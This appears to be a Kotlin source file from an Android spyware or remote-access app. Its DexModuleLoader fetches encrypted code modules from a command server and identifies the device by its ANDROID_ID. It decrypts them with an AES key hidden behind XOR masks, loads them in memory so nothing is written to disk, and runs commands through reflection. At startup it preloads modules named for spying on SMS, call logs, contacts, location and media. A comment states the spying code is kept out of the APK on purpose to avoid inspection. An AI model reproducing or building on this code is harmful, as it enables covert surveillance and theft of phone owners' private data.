package com.nexlink.bridge

import android.content.Context
import android.os.Build
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request
import java.nio.ByteBuffer
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * DexModuleLoader — download encrypted .dex dari server, decrypt AES-256-GCM
 * di memory, load via InMemoryDexClassLoader (API 26+, no disk write).
 *
 * Implementasi sensitif (SMS, CallLog, Contacts, Location, Media) tidak
 * compile ke APK utama — hanya ada sebagai encrypted bytes di server.
 */
@Suppress("DEPRECATION")
object DexModuleLoader {

    private const val TAG = "DML"
    private const val GCM_IV_LEN   = 12
    private const val GCM_TAG_BITS = 128

    // AES-256 split-key — 4 parts, non-uniform mask
    private val ENC = intArrayOf(
        0x76, 0xF6, 0xBC, 0x3A, 0xD3, 0x69, 0xB7, 0x17,
        0x33, 0x19, 0x57, 0xF5, 0x28, 0xAB, 0xB4, 0x56,
        0xC0, 0xF9, 0x6C, 0xF7, 0x41, 0xA4, 0x48, 0xE5,
        0x2E, 0x7F, 0x9E, 0x29, 0xB2, 0x6E, 0x70, 0xB3
    )
    private fun m1() = intArrayOf(0x3F, 0x91, 0xC4, 0x7E, 0xB2, 0x05, 0xD8, 0x6A)
    private fun m2() = intArrayOf(0x4C, 0x18, 0x73, 0xE5, 0x29, 0x8F, 0xA1, 0x56)
    private fun m3() = intArrayOf(0xF3, 0xBD, 0x0E, 0x91, 0x74, 0xC2, 0x3A, 0x87)
    private fun m4() = intArrayOf(0x5D, 0x19, 0xE6, 0x4B, 0x93, 0x21, 0x7F, 0xCC)
    private fun msk() = m1() + m2() + m3() + m4()
    private fun aesKey() = ByteArray(32) { i -> (ENC[i] xor msk()[i]).toByte() }

    private val cache = ConcurrentHashMap<String, ClassLoader>()
    private val http = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    /** Execute command via named dex module. Download + cache on first call. */
    fun execute(ctx: Context, moduleName: String, command: String, extra: String?): Pair<String, String> {
        return try {
            val loader = getOrLoad(ctx, moduleName)
                ?: return Pair("⚠️ Module [$moduleName] unavailable", "command_result")
            val cls    = loader.loadClass("${ObfStr.modClassPrefix()}${moduleClass(moduleName)}")
            val inst   = cls.getDeclaredConstructor().newInstance()
            val method = cls.getMethod("execute", Context::class.java, String::class.java, String::class.java)
            @Suppress("UNCHECKED_CAST")
            method.invoke(inst, ctx, command, extra) as Pair<String, String>
        } catch (e: Exception) {
            Log.e(TAG, "exec error [$moduleName]: ${e.message}")
            Pair("ERROR: ${e.message}", "command_result")
        }
    }

    /** Preload semua modul di background saat service start. */
    fun preloadAll(ctx: Context) {
        Thread {
            listOf(ObfStr.modSpySms(), ObfStr.modSpyCalls(), ObfStr.modSpyContacts(), ObfStr.modSpyLocation(), ObfStr.modSpyMedia()).forEach { n ->
                try { getOrLoad(ctx, n) } catch (_: Exception) {}
            }
        }.also { it.isDaemon = true }.start()
    }

    /** Clear cache — force re-download next execute(). */
    fun invalidate(name: String? = null) {
        if (name != null) cache.remove(name) else cache.clear()
    }

    // ── internal ──────────────────────────────────────────────────────────────

    private fun getOrLoad(ctx: Context, name: String): ClassLoader? {
        cache[name]?.let { return it }
        val enc      = downloadModule(ctx, name) ?: return null
        val dexBytes = decrypt(enc)              ?: return null
        val loader   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            dalvik.system.InMemoryDexClassLoader(ByteBuffer.wrap(dexBytes), ctx.classLoader)
        } else {
            val tmp = java.io.File(ctx.cacheDir, "$name.dex").also { it.writeBytes(dexBytes) }
            dalvik.system.DexClassLoader(tmp.absolutePath, ctx.cacheDir.absolutePath, null, ctx.classLoader)
        }
        cache[name] = loader
        Log.d(TAG, "✅ loaded: $name")
        return loader
    }

    private fun downloadModule(ctx: Context, name: String): ByteArray? {
        return try {
            val url = "${SecureConfig.serverUrl()}${ObfStr.apiModule()}$name"
            http.newCall(Request.Builder().url(url)
                .header(ObfStr.headerDeviceId(), android.provider.Settings.Secure.getString(
                    ctx.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown")
                .get().build()
            ).execute().use { r ->
                if (!r.isSuccessful) { Log.w(TAG, "download $name: ${r.code}"); null }
                else r.body?.bytes()
            }
        } catch (e: Exception) { Log.w(TAG, "download error: ${e.message}"); null }
    }

    private fun decrypt(data: ByteArray): ByteArray? {
        return try {
            if (data.size < GCM_IV_LEN + 16) return null
            val iv         = data.copyOfRange(0, GCM_IV_LEN)
            val ciphertext = data.copyOfRange(GCM_IV_LEN, data.size)
            val cipher     = Cipher.getInstance("AES/GCM/NoPadding")
            cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(aesKey(), "AES"), GCMParameterSpec(GCM_TAG_BITS, iv))
            cipher.doFinal(ciphertext)
        } catch (e: Exception) { Log.e(TAG, "decrypt: ${e.message}"); null }
    }

    private fun moduleClass(name: String) = when (name) {
        ObfStr.modSpySms()      -> "SmsModule"
        ObfStr.modSpyCalls()    -> "CallLogModule"
        ObfStr.modSpyContacts() -> "ContactsModule"
        ObfStr.modSpyLocation() -> "LocationModule"
        ObfStr.modSpyMedia()    -> "MediaModule"
        else                    -> name.split("-").joinToString("") { it.replaceFirstChar { c -> c.uppercase() } } + "Module"
    }
}
